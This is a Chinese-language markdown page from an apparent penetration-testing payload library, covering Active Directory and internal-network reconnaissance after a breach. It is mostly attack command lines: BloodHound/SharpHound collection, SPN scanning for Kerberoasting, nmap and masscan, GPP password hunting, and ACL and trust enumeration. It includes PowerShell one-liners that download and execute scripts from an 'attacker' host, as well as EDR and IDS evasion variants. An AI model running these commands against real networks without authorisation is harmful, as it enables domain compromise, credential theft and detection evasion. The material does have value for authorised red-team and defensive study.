<!-- Language: mixed | Chinese ratio: 18.97% -->
# 内网/后渗透 — 信息收集 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ SRC 场景下大多受限,见 [../compliance.md](../compliance.md)
> 涵盖:主机发现 / 端口扫描 / 域信息 / Bloodhound 收集 / SharpHound / netview / hosts 列举

---

### BloodHound域分析  `bloodhound-enumeration`
使用BloodHound分析Active Directory攻击路径
子类：**域分析** · tags: `bloodhound` `active-directory` `enumeration` `neo4j`

**前置条件：** 域环境；域用户凭证；BloodHound工具

**攻击链：**

**1. SharpHound采集**  _[windows]_
_使用SharpHound采集域信息_
```text
SharpHound.exe -c All
```text

**2. PowerShell采集**  _[windows]_
_通过PowerShell远程加载采集_
```text
IEX(New-Object Net.WebClient).DownloadString("http://attacker/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All
```text

**3. bloodhound-python**  _[linux]_
_使用Python版本采集_
```text
bloodhound-python -u user -p password -d target.com -ns dc_ip
```text

**4. 指定域控制器**  _[windows]_
_指定域控制器采集_
```text
SharpHound.exe -c All --LdapUsername user --LdapPassword pass --DomainController dc.target.com
```text

**5. 启动Neo4j**  _[linux]_
_启动Neo4j数据库_
```text
sudo neo4j console
```text

**6. Cypher查询域管**
_查询域管理员用户_
```text
MATCH (n:User) WHERE n.admincount=true RETURN n
```text

**7. 查询攻击路径**
_查询到域管理员的最短路径_
```text
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```text

**EDR 绕过变体：**

**1. 隐蔽采集**
_随机化文件名避免检测_
```text
SharpHound.exe -c All --LdapUsername user --LdapPassword pass --OutputDirectory C:\Users\Public --RandomizeFilenames
```text

**分析：** BloodHound可发现域内的攻击路径，如权限提升路径、会话信息、组关系等。

**OPSEC：** BloodHound采集会产生大量LDAP查询；可能触发域控制器告警；建议在非工作时间执行

---

### SPN扫描  `spn-scan`
扫描域内服务主体名称
子类：**SPN** · tags: `spn` `kerberos` `enumeration`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 查询所有SPN**  _[windows]_
_查询域内所有SPN_
```text
setspn -T domain.com -Q */*
```text

**2. PowerShell查询**  _[windows]_
_PowerShell查询SPN用户_
```text
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```text

**3. Impacket查询**  _[linux]_
_Impacket查询SPN_
```text
GetUserSPNs.py domain/user:password -dc-ip dc_ip
```text

**4. 查询特定服务**  _[windows]_
_查询HTTP服务的SPN_
```text
setspn -T domain.com -Q HTTP/*
```text

**5. 查找SQL服务**  _[windows]_
_查询MSSQL服务的SPN_
```text
setspn -T domain.com -Q MSSQLSvc/*
```text

**分析：** SPN扫描可以发现域内运行的服务账户，为Kerberoasting攻击做准备。

**OPSEC：** SPN查询是正常的域操作；不会触发明显告警；可用于后续Kerberoasting攻击

---

### 内网端口扫描  `port-scan`
内网端口扫描与服务识别
子类：**端口扫描** · tags: `nmap` `port-scan` `enumeration`

**前置条件：** 内网访问权限；扫描工具

**攻击链：**

**1. 快速扫描**  _[linux]_
_快速扫描常用端口_
```text
nmap -sS -T4 -F 192.168.1.0/24
```text

**2. 全端口扫描**  _[linux]_
_扫描所有65535端口_
```text
nmap -sS -p- 192.168.1.1
```text

**3. 服务识别**  _[linux]_
_服务版本探测和脚本扫描_
```text
nmap -sV -sC 192.168.1.1
```text

**4. 内网存活探测**  _[linux]_
_Ping扫描发现存活主机_
```text
nmap -sn 192.168.1.0/24
```text

**5. Masscan快速扫描**  _[linux]_
_高速端口扫描_
```text
masscan -p1-65535 192.168.1.0/24 --rate=1000
```text

**6. 操作系统识别**  _[linux]_
_识别目标操作系统_
```text
nmap -O 192.168.1.1
```text

**7. UDP扫描**  _[linux]_
_扫描常用UDP端口_
```text
nmap -sU --top-ports 20 192.168.1.1
```text

**8. 漏洞扫描**  _[linux]_
_使用漏洞扫描脚本_
```text
nmap --script vuln 192.168.1.1
```text

**EDR 绕过变体：**

**1. 隐蔽扫描**
_低速分片扫描，添加随机数据_
```text
nmap -sS -T2 -f --data-length 50 192.168.1.1
```text

**2. 诱饵扫描**
_使用诱饵IP混淆扫描来源_
```text
nmap -sS -D RND:10 192.168.1.1
```text

**分析：** 端口扫描可以发现内网中开放的服务，识别潜在的攻击目标。

**OPSEC：** 高速扫描可能触发IDS告警；建议使用较低速率；分时段进行扫描

---

### 域信息收集  `domain-recon`
Active Directory域环境信息收集
子类：**域信息** · tags: `active-directory` `domain` `enumeration`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 域信息**  _[windows]_
_获取域信息_
```text
net config workstation
```text

**2. 域控制器**  _[windows]_
_列出域控制器_
```text
nltest /dclist:domain.com
```text

**3. 域用户**  _[windows]_
_列出域用户_
```text
net user /domain
```text

**4. 域管理员**  _[windows]_
_列出域管理员组_
```text
net group "Domain Admins" /domain
```text

**5. 域信任关系**  _[windows]_
_列出域信任关系_
```text
nltest /domain_trusts
```text

**6. PowerView收集**  _[windows]_
_使用PowerView收集域信息_
```text
IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1"); Get-NetDomain
```text

**7. 获取域策略**  _[windows]_
_获取域密码策略_
```text
Get-DomainPolicy
```text

**8. 获取域控制器**  _[windows]_
_获取域控制器信息_
```text
Get-NetDomainController
```text

**分析：** 域信息收集是内网渗透的基础，可以了解域结构、用户、组等信息。

**OPSEC：** 域信息收集是正常操作；不会触发明显告警；为后续攻击做准备

---

### 网络信息收集  `network-recon`
内网网络拓扑和配置信息收集
子类：**网络信息** · tags: `network` `enumeration` `topology`

**前置条件：** 内网访问权限

**攻击链：**

**1. 网络配置**  _[windows]_
_查看网络配置_
```text
ipconfig /all
```text

**2. 路由表**  _[windows]_
_查看路由表_
```text
route print
```text

**3. ARP缓存**  _[windows]_
_查看ARP缓存_
```text
arp -a
```text

**4. 网络连接**  _[windows]_
_查看网络连接_
```text
netstat -ano
```text

**5. DNS缓存**  _[windows]_
_查看DNS缓存_
```text
ipconfig /displaydns
```text

**6. Linux网络配置**  _[linux]_
_Linux查看网络配置_
```text
ifconfig -a
```text

**7. Linux路由表**  _[linux]_
_Linux查看路由表_
```text
route -n
```text

**8. traceroute**  _[windows]_
_追踪路由_
```text
tracert target_ip
```text

**分析：** 网络信息收集可以了解内网拓扑、网段划分、网关等信息。

**OPSEC：** 这些是正常的网络管理命令；不会触发告警；为后续横向移动做准备

---

### 共享枚举  `share-enum`
枚举网络共享资源
子类：**共享** · tags: `smb` `share` `enumeration`

**前置条件：** 内网访问权限

**攻击链：**

**1. 枚举共享**  _[windows]_
_查看本地共享_
```text
net share
```text

**2. 查看远程共享**  _[windows]_
_查看远程机器共享_
```text
net view \\target_ip
```text

**3. SMBMap枚举**  _[linux]_
_使用SMBMap枚举共享_
```text
smbmap -H target_ip -u user -p password
```text

**4. CrackMapExec枚举**  _[linux]_
_使用CME枚举共享_
```text
crackmapexec smb target_ip -u user -p password --shares
```text

**5. smbclient枚举**  _[linux]_
_使用smbclient枚举_
```text
smbclient -L target_ip -U user%password
```text

**6. PowerView枚举**  _[windows]_
_查找有趣的共享文件_
```text
Find-InterestingDomainShareFile
```text

**分析：** 共享枚举可以发现敏感文件、配置文件、备份文件等有价值的信息。

**OPSEC：** 共享枚举是正常操作；可能发现敏感文件；注意文件访问日志

---

### 用户枚举  `user-enum`
枚举域内用户信息
子类：**用户** · tags: `user` `enumeration` `active-directory`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 列出域用户**  _[windows]_
_列出所有域用户_
```text
net user /domain
```text

**2. 用户详细信息**  _[windows]_
_查看用户详细信息_
```text
net user username /domain
```text

**3. PowerView枚举**  _[windows]_
_使用PowerView枚举用户_
```text
Get-NetUser | select samaccountname,description,admincount
```text

**4. 查找管理员**  _[windows]_
_查找域管理员_
```text
Get-NetUser -AdminCount | select samaccountname
```text

**5. 查找活跃用户**  _[windows]_
_查找最近登录的用户_
```text
Get-NetUser | Where-Object {$_.lastlogon -gt (Get-Date).AddDays(-30)}
```text

**6. Impacket枚举**  _[linux]_
_使用Impacket枚举域用户_
```text
GetADUsers.py -all domain/user:password -dc-ip dc_ip
```text

**分析：** 用户枚举可以发现高价值目标、活跃用户、服务账户等。

**OPSEC：** 用户枚举是正常操作；为后续攻击选择目标；注意识别蜜罐账户

---

### 组枚举  `group-enum`
枚举域内组信息
子类：**组** · tags: `group` `enumeration` `active-directory`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 列出域组**  _[windows]_
_列出所有域组_
```text
net group /domain
```text

**2. 组成员**  _[windows]_
_查看域管理员组成员_
```text
net group "Domain Admins" /domain
```text

**3. PowerView枚举**  _[windows]_
_使用PowerView枚举组_
```text
Get-NetGroup | select samaccountname,admincount
```text

**4. 查找高权限组**  _[windows]_
_查找高权限组_
```text
Get-NetGroup -AdminCount | select samaccountname
```text

**5. 组成员关系**  _[windows]_
_获取组成员_
```text
Get-NetGroupMember "Domain Admins" | select membername
```text

**6. 递归组成员**  _[windows]_
_递归获取组成员（包括嵌套组）_
```text
Get-NetGroupMember "Domain Admins" -Recurse
```text

**分析：** 组枚举可以发现高权限组、组成员关系、嵌套组等。

**OPSEC：** 组枚举是正常操作；重点关注高权限组；注意嵌套组关系

---

### GPO枚举  `gpo-enum`
枚举组策略对象
子类：**GPO** · tags: `gpo` `group-policy` `enumeration`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 列出GPO**  _[windows]_
_列出所有GPO_
```text
Get-GPO -All
```text

**2. PowerView枚举**  _[windows]_
_使用PowerView枚举GPO_
```text
Get-NetGPO | select displayname,whencreated
```text

**3. GPO权限**  _[windows]_
_查找GPO中的受限组_
```text
Get-NetGPOGroup
```text

**4. GPP密码**  _[windows]_
_查找GPP中的密码_
```text
Get-NetGPPPassword
```text

**5. 查找可利用GPO**  _[windows]_
_查找用户受哪些GPO影响_
```text
Find-GPOLocation -UserName user
```text

**分析：** GPO枚举可以发现组策略配置、GPP密码、受限组等信息。

**OPSEC：** GPP密码是常见的信息泄露点；GPO可能包含敏感配置；注意GPO修改权限

---

### ACL枚举  `acl-enum`
枚举访问控制列表
子类：**ACL** · tags: `acl` `access-control` `enumeration`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. PowerView ACL枚举**  _[windows]_
_获取用户对象的ACL_
```text
Get-ObjectAcl -SamAccountName user -ResolveGUIDs
```text

**2. 查找危险权限**  _[windows]_
_查找有趣的ACL权限_
```text
Find-InterestingDomainAcl -ResolveGUIDs
```text

**3. 查找WriteDACL**  _[windows]_
_查找WriteDACL权限_
```text
Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
```text

**4. 查找GenericAll**  _[windows]_
_查找GenericAll权限_
```text
Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
```text

**5. BloodHound ACL分析**
_BloodHound查询ACL关系_
```text
MATCH (n)-[r:AllExtendedRights]->(m) RETURN n,m
```text

**分析：** ACL枚举可以发现权限配置错误，如WriteDACL、GenericAll等危险权限。

**OPSEC：** ACL错误配置是常见的提权路径；重点关注高价值目标；BloodHound可可视化ACL关系

---

### 信任关系枚举  `trust-enum`
枚举域信任关系
子类：**信任关系** · tags: `trust` `enumeration` `active-directory`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 域信任关系**  _[windows]_
_列出域信任关系_
```text
nltest /domain_trusts
```text

**2. PowerView枚举**  _[windows]_
_使用PowerView枚举信任关系_
```text
Get-NetDomainTrust
```text

**3. 森林信任**  _[windows]_
_枚举森林信任关系_
```text
Get-NetForestTrust
```text

**4. 信任详细信息**  _[windows]_
_查看信任详细信息_
```text
Get-NetDomainTrust | select SourceDomain,TargetDomain,TrustType,TrustDirection
```text

**分析：** 信任关系枚举可以发现跨域/跨森林攻击路径。

**OPSEC：** 信任关系可能提供跨域攻击路径；关注双向信任；注意SID历史问题

---

### 计算机枚举  `computer-enum`
枚举域内计算机
子类：**计算机** · tags: `computer` `enumeration` `active-directory`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 列出域计算机**  _[windows]_
_列出域计算机_
```text
net group "Domain Computers" /domain
```text

**2. PowerView枚举**  _[windows]_
_使用PowerView枚举计算机_
```text
Get-NetComputer | select name,operatingsystem,ipv4address
```text

**3. 查找域控制器**  _[windows]_
_查找域控制器_
```text
Get-NetComputer -DomainController
```text

**4. 查找特定系统**  _[windows]_
_查找特定操作系统_
```text
Get-NetComputer -OperatingSystem "*Server 2019*"
```text

**5. 查找活跃计算机**  _[windows]_
_查找在线计算机_
```text
Get-NetComputer -Ping
```text

**6. 查找管理员会话**  _[windows]_
_查找域管理员登录位置_
```text
Find-DomainUserLocation
```text

**分析：** 计算机枚举可以发现域内所有计算机，识别高价值目标。

**OPSEC：** 计算机枚举是正常操作；重点关注域控制器和服务器；查找管理员会话

---

---

← 回 [00-index.md](00-index.md) · 上一篇:[`15-tunneling.md`](15-tunneling.md) · 下一篇:[`17-persistence.md`](17-persistence.md)
